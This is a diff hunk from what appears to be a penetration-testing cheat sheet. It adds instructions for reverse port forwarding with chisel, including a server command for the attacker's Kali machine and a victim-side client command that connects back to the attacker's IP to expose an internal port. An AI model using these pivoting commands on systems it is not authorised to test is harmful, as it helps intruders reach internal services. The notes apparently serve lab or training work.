@@ -204,6 +204,18 @@ ssh> -L <kaliPort>:VictimIP:<VictimPort>
 ssh> -L 8081:192.168.139.125:43022
 
 
+Local Port Forwarding via Chisel:
+=================================
+We need to transfer chisel binary on both victim and attacking machine.
+
+On Kali:
+Format  = ./chisel server -p <PortForServer> --reverse
+./chisel server -p 43022 --reverse
+
+On Victim:
+Format = ./chisel client <AttackingIP>:<PortForServer> R:<PortOfAttackingMachineYouWanttoAccess>:127.0.0.1:<PortOfVictimMachineYouNeedToForward>
+./chisel client 192.168.49.139:43022 R:43023:127.0.0.1:43022
+
 ========
 Cracking
 ========
